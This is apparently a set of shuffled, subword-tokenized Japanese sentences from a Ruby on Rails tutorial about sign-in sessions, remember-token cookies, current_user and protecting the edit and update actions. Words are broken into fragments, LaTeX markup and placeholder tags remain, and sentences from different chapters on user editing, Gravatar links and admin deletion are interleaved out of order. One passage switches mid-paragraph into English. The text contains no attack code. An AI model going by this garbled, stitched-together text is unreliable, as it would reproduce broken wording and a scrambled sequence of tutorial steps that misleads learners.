▁ここでは 、 ” サインイン ” ▁ の 共通 パターン を実装する ために セッション を使用します 。 ここで 、 Web の 世界 には セッション の 振る舞い を 表現 するための いくつかの 異 な った モデル があります 。 ブラウザを閉じ ると セッション を 終 了 する 「 忘 却 モデル 」 、[ パスワード を保存する ] ▁ チェックボックス を使用して セッション を 継 続 する 「 継 続 モデル 」 、 ユーザーが 明示的に サインアウト する まで セッション を 継 続 する 「 永 続 モデル 」 など です
▁ここでは 、 最後の 永 続 モデル を 採 用 する ことにします 。 ユーザーが サインイン すると 、 ユーザーが 明示的に サインアウト する まで サインイン の 状態 を 永 続 させ ます
▁ セッション は 、 RESTful な リソース として 作成 しておく と 便利です 。 たとえば サインイン ページを \ emph { new } セッション で 、 サインイン を \ emph { create } セッション で 、 サインアウト を \ emph { destroy } セッション で それぞれ 扱 います 。
▁ Users リソース のように ▁( Users モデル を経由して ) ▁ データベース を バ ッ ク エ ンド に 持つ リソース とは 異 なり 、 この Sessions リソース では \ href { http :// en . w ikipedia . org / wiki / HTTP _ cookie }{\ emph { cookies } } を使用します 。 cookies とは 、 ブラウザ に保存 される 小さな テキスト データ です 。
▁ サインイン 関連 の 作業 の 大 半 は 、 この cookies を ベース に して 認証システム を 構 築 する ことになります 。
▁ この節 と 次の 節 では 、 セッション 機能 を作成する 準備 として 、 Session コントローラ 、 サインイン 用の フォーム 、 そして これら に 関連する コントローラのアクション を作成します 。
▁それでは 最初に 、 Sessions コントローラ と 認証システム をテストする 結合 テスト を作成します 。
▁{0} 図 8 . 1 {/0} {1} サインイン フォーム のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / signin _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁self を省略した 結果を リスト \ ref { code : new _ session _ tests } に示します 。
▁ セッション の \ ko de { new } アクション と ビュー をテストする 。
▁以下の テストは 、 この時点で は 失敗 するはずです 。
▁ Users リソース の場合 と同様に 、\ ko de { resources } メソッドを使用して 通常の RESTful な ルーティング を設定する ことができます 。
▁ セッション を 編集 したり ユーザーに 表示 したり する必要が ないので 、\ ko de { resources } メソッド に \ ko de { : only } オプション を追加し 、\ ko de { new }、\ ko de { create }、\ ko de { destroy } の 3 つの アクション のみ を有効に します 。
▁ 注 : ▁ サインアウト の ルーティング にある \ ko de { v i a : ▁ ’ delete ’ } は 、 この アクション が ▁ HTTP の \ text tt { DELETE } リクエスト によって 呼び出される ことを 示 しています 。
▁ 注 : サインイン と サインアウト の アクション の ルーティング は カスタム で 設定 します が 、 セッション の 生成 アクション への ルーティング は デフォルト を使います ▁( i . e . , ▁\ ko de { [ resource ▁name ] _ path }) .
▁ 新しい セッション 用 ▁( サインイン )
▁ / sign out
▁ セッション を削除する ▁( サインアウト )
▁ 最初の Sessions コントローラ 。
▁最後に 、 サインイン ページを 新 規 に 定義 します 。
▁この ページ は 新 規 セッション 用 なので 、 今 から 作成する サインイン ページを \ ko de { app / views / sessions / new . html . erb } に置く ことに 注 目 ください 。
▁ これはリスト \ ref { code : initial _ signin _ page } で使用されていま した 。
▁ 最初の サインイン ビュー 。
▁ ユーザー登録フォーム のとき と同様に 、 サインイン フォーム でも Capybara を使って フォーム に 値を 入力 し 、 ボタン を クリック する テスト を行う ことができます 。
▁ テスト を作成し ている と 、 私 た ち は アプリケーションを さまざまな 側 面 から 設計 すること を 強 い られます 。 これは テスト駆動開発 の 素晴らしい 副 次 的 効果 の ひとつ です 。
▁{0} 図 8 .2{/0} {1} サインイン 失敗 時 のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / signin _ failure _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ここでは エラー を フラッシュメッセージ として 表示する ので 、 以下のように テスト できます 。
▁\ ko de { ha ve _ select or } メソッドは 、 特定の セ レ ク タ 要素 ▁( HTML タグ など ) ▁ がある かどうかをチェックし ます 。 なお 、 Capybara ▁2 . 0 では \ emph { 画面 に 表示される 要素 } しか チェック できません 。
▁ セ レ ク タ 要素 ( つまり タグ ) は 以下のように 指定 します 。
▁上のコードは \ ko de { div } タグ がある かどうかをチェックし ます 。
▁ これはリスト \ ref { code : initial _ failing _ signin _ test } で使用されていま した 。
▁ サインイン 失敗 時の テスト 。
▁ サインイン に 失敗した 時の テストが できた ので 、 次 は サインイン に成功した場合 のテスト を作成し ましょう 。
▁ユーザー プロファイル ページ が表示され ること ▁( ページ タイトル が ユーザー名 になっている こと ) 、 サイトの ナビゲーション に 次の 3 つの 変更 が 加 え られ ている ことを確認する よう 、 テスト を変更 します 。
▁ プロファイル ページ ヘ の リンク の 表示
▁[ S ig n ▁ out ] ▁ リンク の 表示
▁[ S ig n ▁in ] ▁ リンク の 非 表示
▁ サインイン に 成功 後 表示される ユーザー ・ プロファイル のモックアップ 。 ▁\ href { http :// railstutorial . org / images / figure s / signin _ success _ mockup _ bootstrap - full . png }{( 拡大 表示 ) }
▁ これはリスト \ ref { code : signin _ success _ tests } で使用されていま した 。
▁ サインイン に 成功 した とき のテスト 。
▁上のコードでは 、 Capybara の \ ko de { ha ve _ link } メソッドが 導入 されています 。
▁このメソッドは 、 リンク テキスト を 引数に と ります 。 オプション として 次のように \ ko de { : href } パラメータ を加え ると 、
▁ ア ン カ ー タグ \ ko de { a } に \ ko de { href } ▁( URL ) ▁ 属性 を追加する こともできます ▁( この 例 では 、 ユーザー プロファイル へのリンク )。
▁上の テストでは 、\ ko de { up case } メソッドを使用して ユーザーの メールアドレスを 大文字 に変換 することで 、 大文字 小文字 を 区別 しない データベース が 使用されている 場合 であっても ユーザーを 確 実 に 検索 できるように 配 慮 して ある ことに注目してください 。
▁ テスト の 準備 が完了し たので 、 いよいよ サインイン フォームの 開発 に 取り か か り ましょう 。
▁この ユーザー登録フォーム と サインイン フォームの 主 な 違 い は 、 サインイン フォーム には Session モデル がない ために \ ko de {@ user } 変数 のような 存 在 がない ことです 。
▁self を省略した 結果を リスト \ ref { code : signin _ form } に示します 。
▁ サインイン フォーム のコード 。
▁{0} 図 8 . 4 {/0} {1} サインイン フォーム ▁(\ href { http :// localhost :3000/ signin }{/ signin })。 \ href { http :// railstutorial . org / images / figure s / signin _ form _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ユーザー を作成する ▁( ユーザー登録 ) ▁ 場合 と同様 、 セッション を作成する 場合 ▁( サインイン ) ▁ で 最初に や ること は 、\ emph { 正しく ない } 入力 の 取り 扱 い です 。
▁ これはリスト \ ref { code : initial _ create _ session } で使用されていま した 。
▁ 認 証 に 失敗した とき 、\ ko de { authenticate } の 返 り 値 は \ ko de { false } になる ことを思い出してください 。 ユーザーの サインイン 方法 の 方 針 を まとめ ると 以下の ようになります 。
▁# ▁ ユーザーを サインイン させ 、 ユーザー ページ ▁( show ) ▁ に リダイレクト する 。
▁# ▁ エラーメッセージ を表示し 、 サインイン フォーム を 再 描画 する 。
▁ 代わりに 、 サインイン に 失敗した ときに フラッシュメッセージ を表示する ことにします 。
▁ 最初の コードをリスト \ ref { code : failed _ signin _ at te m p t } に示します ▁( このコード は わ ざ と 少し 間 違 え て あります )。
▁ サインイン の 失敗 を扱う ▁( 誤 り あり )。
▁{0} 図 8 . 6 {/0} {1} サインイン に 失敗した とき の フラッシュメッセージ 。 \ href { http :// railstutorial . org / images / figure s / failed _ signin _ flash _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 本 文 および リスト \ ref { code : failed _ signin _ at te m p t } の コメント で 述 べ た ように 、 このコード には 誤 り があります 。
▁{0} 図 8 . 7 {/0} {1} フラッシュメッセージ が 消 え ずに 残 っている 例 。 \ href { http :// railstutorial . org / images / figure s / flash _ persisten ce _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ フラッシュメッセージ の 残 留 問題 はこの アプリケーションの バグ です 。 この問題 を修正する 前に 、 この問題 を キャッチ する テストを書く の が 正しい や り 方 です 。
▁ 特に 、 現在の サインイン 失敗 テストでは この問題 が キャッチ され ずに パス し てしまいます 。
▁ 当 然 ながら 、 既 知 の バグ が 未 修正 の 状態 であれば 、 この テストは パス する べ き ではありません 。 この問題 を キャッチ する 、 失敗する テスト を追加しましょう 。
▁ 幸 い 、 結合 テストは フラッシュメッセージ 残 留 などの 多くの 問題 解決 において 大 活 躍 します 。 期 待 される 動作 は 以下の テスト で 正 確 に 表現 されています 。
▁この テストは 、 無効な サインイン データ を送信し 、 次に Web サイトの レイアウト にある Home リンクを 開 き 、 フラッシュメッセージ が表示され ていない ことを確認します 。
▁ これはリスト \ ref { code : correct _ signin _ failure _ test } で使用されていま した 。
▁ サインイン の 失敗 を 正しく テスト する コード 。
▁ 再度 テスト を実行すると 、 期待どおり 失敗 します 。
▁ 失敗する テストが パス する ように な るために 、\ ko de { flash } の代わりに \ ko de { flash . now } を使用します 。 これ も ページ で フラッシュメッセージ を表示する ために 特に 設計 された メソッド ですが 、\ ko de { flash } の場合 とは 異 なり 、 他の リクエスト が発生し たら すぐ に メッセージ を 消 します 。
▁ これはリスト \ ref { code : correct _ signin _ failure } で使用されていま した 。
▁ サインイン が 失敗した とき の 正しい コード 。
▁これで 、 ユーザー情報 が 無効な 場合 の テストスイート が 緑色 ▁( 成功 ) ▁ に なりました 。
▁ サインイン 失敗 を テスト できるように した ので 、 次 は 実際に ユーザーを サインイン させ ましょう 。
▁ この節 で 必要な Ruby の プログラミング は 、 本書 の中で は これまで で 最も 難 易 度 が 高 く な っています 。 どう か 最 後 まで あ き ら め ずに が ん ば って ください 。 ここ から の 力 仕 事 に 備 え て お き ましょう 。
▁ 幸 い 、 は じ め の 一 歩 は 簡単 です 。 Sessions コントローラの \ ko de { create } アクション は すぐ でき あ が ります 。
▁ 残念ながら 、 少々 ズ ル も しています 。
▁ な ぜ これ が ズ ル な のか という と 、 何 と \ ko de { sign _ in } は この時点で は 存 在 していない のです 。
▁ この節 の 残 り は 、 この 関数 を 完成 させる ことに 費 や されます 。
▁ Sessions コントローラの \ ko de { create } アクション が 完成 した ところ ▁( まだ 動 き ません )。
▁これ より サインイン モデル の実装 を 開 始 します 。 具体的には 、 サインイン 状態 を 「 永 続 化 」 し 、 ユーザーが 明示的に サインアウト したときに のみ セッション を 終 了 します 。
▁ サインイン 関数 そのもの は 伝 統 的な MVC ▁( model - view - controller ) ) ▁ に 帰 着 します 。 特に 、 いくつかの サインイン 関数 については コントローラ と ビュー の どちら から も 使用 できるように する必要があります 。
▁ 認 証 のために まったく 新しい モジュール を 作る ことも 可能です が 、 Sessions コントローラ には 既に \ ko de { Sessions Helper } という モジュール が 備 わ っています 。
▁ デフォルトで は 、 すべての ヘルパーは ビューで 使用できます が 、 コントローラ では 使用 可能 になって いません 。
▁ Sessions ヘルパーは ビュー と コントローラの 両方 で メソッドが 必要となる ので 、 コントローラ では 上の ように 明示的に インクルード する必要があります 。
▁ HTTP は \ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol # HTTP _ session _ state }{\ emph { ス テ ート レ ス な プロトコル } } であり 、 そのまま では 状態 が 保存 され ないので 、 Web アプリケーションの サインイン は 、 ページ から ページの 移動 を 追 跡 する という 方法で 実装 する必要があります 。
▁ユーザーの サインイン 状態 を 保 持 する ひとつ の 方法は 、 伝 統 的な Rails セッション ▁( 特殊な \ ko de { session } 関数 を使用 ) ▁ を使って 、 ユーザー ID に 等 しい 「\ emph { 記憶トークン ▁( remember ▁ token ) }」 を 保 持 することです 。
▁この \ ko de { session } オブジェクトは 、 ユーザー id を cookies に 保 持 することで 、 ページ 移動 後に も ユーザー id を参照 できるように しています 。 cookies は ブラウザ が 閉 じ られ ると 無効 になります 。
▁ アプリケーション は 、 ページ ごとに 以下の 呼び出し を行います 。
▁これ だけで 、 ユーザーを 取り出す ことができます 。
▁Rails では 、 セッション が セキュア になる ように 扱 っています ので 、 悪意のある ユーザーが id を なり す ま そう として も 、 Rails は セッション ごとに 生成される 特 別の \ emph { セッション id } によって 不 一 致 を 検出 します 。
▁ 私 た ち の アプリケーション 設計 では 、\ emph { 永続的 な } セッション を 採 用 します 。 つまり 、 ブラウザを閉じ た 後に も サインイン 状態 を 保 持 する ということ であり 、 サインイン した ユーザー に対して 何らかの \ emph { 恒 久 的な } 識 別 子 を使用する 必要があります 。
▁ これを 実現 するために 、 ユーザー ごとに 一意 かつ 安全 な 記憶トークン を生成し 、 ブラウザを閉じ ても 無効 に な らない \ emph { 恒 久 的な } cookies として 登録 します 。
▁{0} 図 8 . 8 {/0} {1} \ ko de { remember _ token } 属性 を追加した User モデル 。 {/1}
▁ 記憶トークン 用の 最初の テスト 。
▁ コマンドライン で 以下のように 記憶トークン を生成する ことで 、 上の テストが パス する ようになります 。
▁\ ko de { remember _ token } を \ ko de { users } テーブル に追加 した マイグレーション 。
▁次に 、 いつものように 開発 データベース と テスト データベース を更新し ます 。
▁ この時点で 、 User モデルの spec は パス するはずです 。
▁ 有 力 な 候 補 として さまざまな もの が 考え られます が 、 基本的に は 一意性 を 確 保 できる 、 長 く て ランダム な 文字列 で さ え あ れば どんな もの でも 良い でしょう 。
▁ 記憶トークン を さらに セキュア に するために は 、 新しい セッション を作成する たびに トークン を更新する の が よい 方法 です 。 この 方法 なら 、 攻撃者が 盗 んだ cookies を使用して 本 物 のユーザー になり す ま して サインイン し よう と する ▁(\ href { http :// en . w ikipedia . org / wiki / Session _ h i j ack ing } { セッション ハイジャック }) ▁ ことが あって も 、 ユーザーが 次 回 サインイン するときに は トークン が 期限切れ になります 。
▁( セッション ハイジャック は 、 セキュリティ上の 注意 を 呼 び かけ るために これを 実 演 する \ href { http :// code b u t l er . com / fi re sh e e p } { F ir e sh e e p } アプリケーション によって 広 く 知 られ る ようになりました 。 F ir e sh e e p を使用すると 、 公 共 W i - F i ネットワーク 経由で 接続 したときに 多くの 有 名 Web サイトの 記憶トークン が 丸 見え になっている ことがわかります 。
▁ サンプルアプリケーション では 、 新規作成 された ユーザーを その 場 で サインイン させ 、 その 副 作 用 として 記憶トークン が つ い で に 作成されます が 、 この 動作 に 依 存 すべき ではありません 。 安全 を 確 保 するために 、\ emph { すべての } ユーザーが 必ず 最 初 から 有効な 記憶トークン を持つ ように する必要があります 。
▁ユーザーの 削除 は どの ユーザーに も 許可 できる もの では ないので 、 管理 ユーザー ▁( admin ) ▁ の 特 権 クラス を作成し 、 この ユーザーに のみ 削除 を 許可 する ようにします 。
▁ あ のとき は \ ko de { before _ save } という コールバック を使用し ましたが 、 ここでは それ に よく 似 た \ ko de { before _ create } という コールバック を使用して 、 ユーザー 新規作成 時に 記憶トークン を設定する ことにします
▁Active ▁Record で サポート される コールバック の 種類 の詳細については 、 Rails ▁ G u id es の 「\ href { http :// guides . rubyonrails . org / v 3 . 2.1 3 / active _ record _ validations _ c all b ack s . html } { コールバック について } ▁( 英語 )」 を参照してください 。
▁ 記憶トークン をテストする ために 、 最初に テスト ユーザー を保存し ▁( これまで は 作成 されて も 保存 は されていません で した ) 、 次に ユーザーの \ ko de { remember _ token } 属性 が 空 欄 でない ことを確認します 。
▁これにより 、 必要 が生じ たとき に ランダム 文字列 を変更する の に 十分 な 柔 軟 性 が 得られ ます 。
▁ 最大 の違い は 、 ユーザー登録 は 誰 でも 実行 できます が 、 ユーザー情報 を 更新 できる のは その ユーザー 自身 に 限 られ る ということです 。
▁作成した コードをリスト \ ref { code : remember _ token _ sh o ul d _ not _ b e _ blank } に示します
▁ 記憶トークン が 有効 である ▁( 空 欄 の ない ) ▁ こと をテストする 。
▁最初に 、 Gravatar 画像 を変更する リンク に 注目してください 。 Gravatar の Web サイト を探し てみると 、\ href { http :// gravatar . com / email s } { http :// gravatar . com / email s } に 画像 の 追加 と 編集 を 行える ページ があり ました ので 、\ ko de { edit } ページ 上の この URL { p 2 } へのリンク について ▁ テスト を行なう ことにします 。
▁ Gravatar サイト にアクセス すると 、 実際には \ href { http :// en . gravatar . com / email s } { http :// en . gravatar . com / email s } に リダイレクト されます 。 ここ は 英語 ユーザー 向け ですが 、 他の 言語 を 考 慮 し 、\ text tt { en } を URL に含め ません で した 。
▁{0} 図 9 . 1 {/0} {1} ユーザー 編集 ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / edit _ user _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁作成した コードをリスト \ ref { code : user _ edit _ spec s } に示します
▁ユーザー 編集 ページ のテスト 。
▁上のコードは \ emph { メソッド 参 照 } と呼ばれる もの で 、 こうすることで Rails は \ ko de { create _ remember _ token } という メソッド を探し 、 ユーザー を保存する 前に 実行 する ようになります
▁次に 、 このメソッド 自身 は User モデルの 内部で しか 使用 し ないので 、 外部 の ユーザーが アクセス できるように する必要はありません 。
▁これ に対応する アプリケーション コードは 、 Users コントローラの \ ko de { edit } アクション の中に 書き 込 み ます 。
▁ユーザーの id は \ ko de { params [: id ]} 変数 で 取り出す ことができる の を 思い 出 してください 。 つまり 、 リスト \ ref { code : initial _ edit _ action } の コードを 使 えば その ユーザーを 指定 できる ということです 。
▁ このため 、 上 を コンソール で 実行 すると \ ko de { No M e th o d Error } 例外が発生します 。
▁最後に 、\ ko de { create _ remember _ token } メソッドは 、 ユーザーの 属性 の ひとつ に 「\ emph { 要素 代入 ▁( as sign m ent ) }」 する必要があります 。 この 文 脈 から 、\ ko de { remember _ token } の 前に \ ko de { self } キーワード を 追加する必要があります 。
▁上のコード に \ ko de { self } という キーワード がない と 、 要素 代入 によって \ ko de { remember _ token } という名前の \ emph { ローカル } 変数 が作成され てしまう ので 、 注意 が必要です ▁( ここで 本 来 必要な のは ローカル変数 ではなく 、 インスタンス変数 です )。 この 動作 は 、 Ruby における オブジェクト 内部 への 要素 代入 の 仕 様 による ものです 。
▁\ ko de { self } キーワード を与える ことで 、 要素 代入 は 正しく その ユーザーの \ ko de { remember _ token } 属性 を設定する ように なり 、 その 結果 ユーザーが 保存 される ときに 他の 属性 と 一 緒 に この 属性 も データベースに保存 されます
▁(\ emph { to _ s } メソッドを 呼び出し ている のは 、\ ko de { nil } トークン を 扱 え るように する ためです 。 ブラウザで nil トークン が発生する ことは あって は なり ません が 、 テスト 中に 発生 すること は あり え る ためです )。
▁ これはリスト \ ref { code : before _ create _ remember _ token } で使用されていま した 。
▁\ ko de { before _ create } コールバック を使用して \ ko de { remember _ token } 属性 を作成する 。
▁ ちなみに 、\ ko de { private } キーワード 以降 のコードは 、 強 調 の ため \ ko de { create _ remember _ token } の インデント を 1 段 深 く して あります
▁( 経験 上 、 こう しておく ことをお勧めします )。
▁ 仕 上 げ に 、 ユーザー 設定 の リンク に URL を 1 つ 追加 して サイト 内 を 移動 できるようにします 。
▁ いよいよ 、 最初の サインイン 要素 である \ ko de { sign _ in } 関数 自身 の実装 に 取り か か り ましょう 。
▁self を省略した 結果を リスト \ ref { code : settings _ link _ test } に示します 。
▁[ S e tt ing s ] ▁ リンク のテスト を追加する 。
▁作成した コードをリスト \ ref { code : sign _ in _ f un c tion } に示します
▁ 完 全 だ が まだ 動作 しない \ ko de { sign _ in } 関数 。
▁self を省略した 結果を リスト \ ref { code : sign _ in _ helper } に示します 。
▁ ユーザーが サインイン するための テスト ヘルパー 。
▁# ▁ Capybara を使用して い ない場合 にも サインイン する 。
▁ cookies の 各 要素 は 、 それ 自体 が 2 つの 要素 ▁(\ ko de { value } と オプション の \ ko de { expir es } 日 時 ) ▁ の ハッシュ になっています 。
▁たとえば 以下のように 、 cookies に 20 年 後に 期限切れ になる 記憶トークン に 等 しい 値 を保存する ことで 、 ユーザーの サインイン を 実装 できます 。
▁ コメント 行 にも 書い て ある とおり 、 Capybara を使用 していない と フォーム への 自動 入力 が 動作 しません 。 このような 場合に 備 え て 、 ユーザー から \ ko de { no _ ca p y a bar a : ▁true } オプションを 渡 せる ように し 、 デフォルトの サインイン メソッドを 上 書き して cookies を直接 操作 できるようにします 。 ユーザー情報 記 憶 用の トークン を cookies ▁( ク ッ キー ) ▁ に保存 しておきます 。 A s ▁ not ed ▁in ▁the ▁ comment ▁ line , ▁ fi ll ing ▁in ▁the ▁ form ▁do es n ’ t ▁ w or k ▁ w h en ▁ not ▁ us ing ▁ Capybara , ▁ s o ▁to ▁ co ver ▁this ▁ case ▁we ▁ allow ▁the ▁ user ▁to ▁ pass ▁the ▁ option ▁\ ko de { no _ ca p y a bar a : ▁true } ▁to ▁ o ver ri de ▁the ▁ default ▁ signin ▁ method ▁and ▁ ma n ip ul at e ▁the ▁ cookies ▁d ir e ct ly .
▁=> ▁Sun , ▁1 3 ▁Ma r ▁20 11 ▁0 3 : 3 8 : 5 5 ▁ UTC ▁+00:00
▁ これはリスト \ ref { code : delete _ destroy _ test } で使用されていま した 。
▁=> ▁S at , ▁0 2 ▁ J an ▁2010 ▁0 3 : 3 9 : 14 ▁ UTC ▁+00:00
▁[ S e tt ing s ] ▁ リンク を追加する 。
▁上の ように 20 年 で 期限切れ になる cookies 設定 は よく 使われ るように なり 、 今 では Rails にも 特殊な \ ko de { per ma n ent } という 専 用の メソッド が追加され た ほど です 。 この メソッドを使用すると 、 コードは 以下のように シ ン プ ル になります 。
▁ 後 で 使う ために 記憶トークン を cookies に保存 する方法 の 説明 が 終わり ました ので 、 今度は 移動 先 の ページ で ユーザーを 取り出す 方法 について 学 び ましょう 。
▁\ ko de { sign _ in } 関数 の コードを もう い ち ど よく 見 て みてください 。
▁ 現時点では 、 上のコード のうち 、 以下のコード だけ が 動作 していません 。
▁self を省略した 結果を リスト \ ref { code : user _ update _ action _ unsuccessful } に示します 。
▁\ ko de { current _ user } の コードを 書く 上で 、 以下の行 については 注意 が必要です 。
▁ 無効な 情報 が 送信された 場合 、 更新 の 結果 として \ ko de { false } が 返 され 、\ ko de { else } に 分 岐 して 編集 ページを 再度 レンダリング します 。
▁ 上 は 「\ emph { 要素 代入 ▁( as sign m ent ) }」 である ことに注意してください 。 この current _ user = は 別 途 定義 が必要です 。
▁ これはリスト \ ref { code : current _ user _ equ al s } で使用されていま した 。
▁\ ko de { current _ user } への 要素 代入 を定義する 。
▁上のコード で 使用されている 特殊な 文法 は 混 乱 し やすい ので 注意 してください 。 普通 の プログラミング 言語 では 、 定義 する メソッド の名前 に 等 号 を使用する ことはできません が 、 Ruby では メソッド 名 末尾 の 等 号 には 特殊な 意味 があり 、 上のコード は \ ko de { current _ user } への 要素 代入 を扱う ように 設計 された \ ko de { current _ user = } という メソッドを 単 に 定義 します 。
▁ そして 最終的に \ ko de { current _ user = } という メソッドが 呼び出され ます 。
▁{0} 図 9 . 3 {/0} {1} 更新 フォームの 送信 で 発生 した エラーメッセージ 。 \ href { http :// railstutorial . org / images / figure s / edit _ with _ invalid _ information _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 9 . 4 {/0} {1} \ href { http :// gravatar . com /}{ Gravatar } の 画像 調 整 インターフェイス ▁( 写 真 は \ href { http :// michael hartl . com /}{ 誰 か さ ん }) {/1} 。
▁その 引数 は 要素 代入 の 右 側 に ひとつ 置かれます ▁( ここでは サインイン する ユーザー )。
▁\ ko de { update } アクション のテスト も 、\ ko de { create } アクション 用の テスト と だ いた い 同じです 。
▁この 一 行 メソッドは 、 単 に \ ko de {@ current _ user } インスタンス変数 を 設定 し 、 後に 使用 するために ユーザーを 効率 よく 保存 します 。
▁self を省略した 結果を リスト \ ref { code : current _ user _ w r on g } に示します 。
▁ユーザー \ ko de { update } アクション のテスト 。
▁ つ い 使って み た くなる が 実際には 役 に 立 た ない \ ko de { current _ user } の 定義
▁この 行 は 使用 し ないこと 。
▁ 実は 、 この 2 つ は 完全に 同 等 です 。 \ ko de { attr _ accessor } は 、 単 に ゲ ッ ター メソッド や セ ッ ター メソッドを 自動的に 作成する 便利な 方法で しか ありません 。
▁リスト \ ref { code : sign _ in _ helper } のとき
▁これにより 、\ ko de { user . reload } を使用して テスト データベースから \ ko de { user } 変数 に 再度 読み込み が行われ 、 ユーザーの 新しい 名前 と メールアドレス が 新しい 値 と 一致する かどうか が 確認 されます 。
▁ テストにパス する 必要 のある 、 リスト { p 0} の {2} update {/2} アクション は 、 リスト \ ref { code : signin _ up on _ signup } に示したように 、 {2} create {/2} アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁self を省略した 結果を リスト \ ref { code : current _ user _ working } に示します 。
▁ 変更 すべき 点 は 、 以下 を
▁ これはリスト \ ref { code : user _ update _ action _ unsuccessful } で使用されていま した 。
▁\ ko de { remember _ token } を使用して 現在のユーザー を検索する 。
▁この 代入 演算子 は 、\ ko de {@ current _ user } が 未 定義 の 場合に のみ 、\ ko de {@ current _ user } インスタンス変数 に 記憶トークン を設定します
▁ この節 のコード を使用することで 、 ユーザー 編集 ページ は 動作 するはずです 。 テストスイート を もう一度 実行 してみる と 、 今度は 緑色 になる でしょう 。
▁ 通常 、 これは 初期 値が \ ko de { nil } である 変数 への 代入 を 意味 します が 、\ ko de { false } 値 も \ ko de { | | = } 演算子 によって 上 書き される ことに注意してください 。
▁つまり 、 以下のコード は
▁ ある ユーザー に対して \ ko de { current _ user } が 初めて 呼び出される 場合は \ ko de { find _ by } メソッド を呼び出します が 、 以後 の 呼び出し では データベース にアクセス せずに \ ko de {@ current _ user } を返します
▁このコードは 、 ひとつ のユーザー リクエスト に対して \ ko de { current _ user } が 何 度 も 使用される 場合に のみ 有 用 です 。 いずれ の場合 も 、 ユーザーが Web サイト にアクセス すると \ ko de { find _ by } は 最 低 1 回 は 呼び出され ます 。
▁この節では 、 ユーザーに サインイン を 要求 し 、 かつ 自分 以外の ユーザー情報 を変更 できない ように する セキュリティ モデル を 構 築 しましょう 。
▁\ text tt { | | = } という 記 法 は 非常に Ruby 的 であり 、 Ruby という 言語 を 強 く 特 徴 づ け る ものです 。 Ruby プログラミング の 達 人 になり たい のであれば 、 この 記 法 を 習 得 すること が 重要です 。
▁ 保 護 された ページ にアクセス した とき の ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / signin _ page _ protected _ mockup _ bootstrap - full . png }{( 拡大 ) }
▁\ emph { or ▁ equ al s } という 概念 は 一 見 神 妙 不 可 思 議 に 見え ます が 、 他の もの に な ぞ ら え て 考え ること で 理解 できます 。
▁\ ko de { edit } アクション と \ ko de { update } アクション の セキュリティ 制限 は まったく 同じ なので 、 これら を 共通 の RSpec ▁\ ko de { de sc ri b e } ブロック で 扱 う ことにします 。
▁ 最 初 は 、 現在 定義されている 変数 を変更する という あり ふ れ た コード について説明し ます 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de { edit } アクション と \ ko de { update } アクション が 保 護 されている かどうか テスト する 。
▁ 多くの コンピュータ プログラム では 、 以下のように して 変数 の 値を 1 つ 増 や す ことができます 。
▁ そして 、 Ruby ▁( C 、 C + + 、 P er l 、 P y th on 、 J a v a ) ▁ などの 多くの プログラミング 言語 では 、 以下のような 短縮 形 を使用して 上の 演 算 を行う ことができます 。
▁ >> ▁ x ▁= ▁1
▁=> ▁1
▁ >> ▁ x ▁+ = ▁1
▁=> ▁2
▁ >> ▁ x ▁* = ▁3
▁=> ▁ 6
▁ な ぜ こ ん な ことを するか という と 、 ブラウザ は \ ko de { update } アクション を直接 表示する ことができ ない からです 。 ブラウザ は 、 編集 フォーム を 送信 することで 間 接 的に その アクションに 到 達 すること しか できない ので ▁( 訳 注 : ▁ update は 純 粋 に 更新 処理 を行う アクション で あって 、 そこで 何か を表示する わ け では ないので ) 、 Capybara では 対応 できません 。
▁ >> ▁ x ▁- = ▁ 7
▁=> ▁- 1
▁ そして 、 edit ページを 表示 しても \ ko de { edit } アクション の 認 可 テストは できます が 、\ ko de { update } アクション の 認 可 テストは できません 。
▁ こう した 事 情 から 、\ ko de { update } アクション 自体 をテストする には リクエスト を直接 発行する 以外に 方法 が ありません ▁(
▁\ ko de { patch } メソッド がある こと から わかるように 、 Rails の テストでは \ ko de { get }、\ ko de { post }、\ ko de { delete } メソッド も サポート されています )。
▁これらの メソッド のいずれか を使用して HTTP リクエスト を直接 発行する と 、 低 レベル の \ ko de { response } オブジェクト にアクセス できるようになります 。
▁ >> ▁@ user
▁ Capybara の \ ko de { page } オブジェクト と異なり 、 ▁\ ko de { response } オブジェクトは サーバー の 応答 自体 のテスト に 使用できます 。 ▁ この場合は 、 サインイン ページ への リダイレクト による \ ko de { update } アクション の 応答 を 確認 します 。
▁=> ▁nil
▁ >> ▁@ user ▁= ▁@ user ▁| | ▁" the ▁ user "
▁self を省略した 結果を リスト \ ref { code : author ize _ before _ filter } に示します 。
▁=> ▁" the ▁ user "
▁ >> ▁@ user ▁= ▁@ user ▁| | ▁" an other ▁ user "
▁ before _ filter に \ ko de { signed _ in _ user } を追加する 。
▁\ text tt { nil } の 論理値 は 偽 ▁( false ) ▁ です 。 初めて 代入 する とき は 「\ text tt { nil ▁| | ▁" the ▁ user " }」 と なり 、 これは 「\ text tt { " the ▁ user " }」 と 評価 されます 。 同様に 、 2 度 目 の 代入 では 「\ text tt { " the ▁ user " ▁| | ▁" an other ▁ user " }」 と なり 、 これ も 「\ text tt { " the ▁ user " }」 と 評価 されます 。 あらゆる 文字列 の 論理値 は 真 ▁(\ text tt { true }) ▁ なので 、 ▁\ text tt { | | } を使用する 一 連 の 式 は 、 いずれ も 1 番目の 式 が 評価 された 時点 で 終 了 します
▁ 上 述 した 多くの 演算子 を コンソール セッション 上で 実行 して 比 較 してみる と 、\ text tt {@ user ▁= ▁@ user ▁| | ▁ value } は 「\ text tt { x ▁= ▁ x ▁ O ▁ y }」 の パターン に 該 当 し 、\ text tt { O } が \ text tt { | | } に置き 換 わ った だけ の もの である ことがわかります 。 ということ は 、 この 演 算 は 以下 と同じ であること が 推測 できます 。
▁ >> ▁@ user ▁| | = ▁" the ▁ user "
